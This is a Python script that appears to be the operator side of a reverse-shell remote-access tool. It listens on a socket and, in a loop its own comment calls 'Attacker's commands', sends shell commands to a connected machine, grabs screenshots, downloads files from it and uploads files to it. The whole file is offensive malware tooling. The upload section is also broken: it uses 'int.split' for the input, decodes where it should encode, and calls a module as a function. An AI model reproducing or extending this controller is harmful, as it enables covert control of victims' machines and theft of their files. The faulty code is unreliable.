from base64 import b64decode
from socket import AF_INET, SOCK_STREAM, socket
import os
import string


#creating a Listener
s = socket(AF_INET,SOCK_STREAM)
s.bind(("127.0.0.1",1234))
s.listen()
print("[*] Listening for incoming connections .... ")

#Accepting Incoming Connections
conn, addr = s.accept()
print(f"[*] Received connection from {addr[0]}:{addr[1]}")

#Loop to receive Attacker's commands
while True:
    inp = input("$ ")
    cmd = inp + '\n'

    # close connection / handeling the quit command
    if inp.lower() in ('q', 'quit'):
        conn.send(cmd.encode())
        resp = conn.recv(1234).decode()
        print(resp)
        exit(0) #terminate code

    #screenshot
    elif inp.lower() == "screenshot" :
        conn.send(cmd.encode())
        b64_string = ''

        while True:
            tmp = conn.recv(32768).decode()
            b64_string += tmp
            if len(tmp) < 32768:
                break

        with open('screenshot.png', 'wb') as f:
            f.write(b64decode(b64_string))

        print("Screenshot saved successfully")

    #File Download
    elif inp.split(' ')[0].lower() == "download":
        conn.send(cmd.encode())
        b64_string = ''

        while True:
            tmp = conn.recv(32768).decode()
            b64_string += tmp
            if len(tmp) < 32768:
                break
        
        #File not found
        if "not found" in b64_string:
            print(b64_string)
            continue
        #File_name:b64_string
        file_name, b64_string = b64_string.split(':')
        with open(file_name, 'wb') as f:
            f.write(b64decode(b64_string))

        print ("File saved successfully")

    #upload file name
    elif inp.split(' ')[0].lower() == "upload":
        file_name = int.split(' ')[1].strip()
        if not os.path.exists(file_name):
            print("File does not exist")
        else:
            file_content = ''
            with open(file_name, 'rb') as f:
                file_content = b64decode(f.read())
            tmp = ":".join([file_name, string(file_content)]) + "\n"
            conn.send(tmp.encode())
            resp = conn.recv(1024).decode()
            print(resp)

    #shell commands 
    else:
        conn.send(cmd.encode())
        resp = conn.recv(32768).decode()
        print(resp)
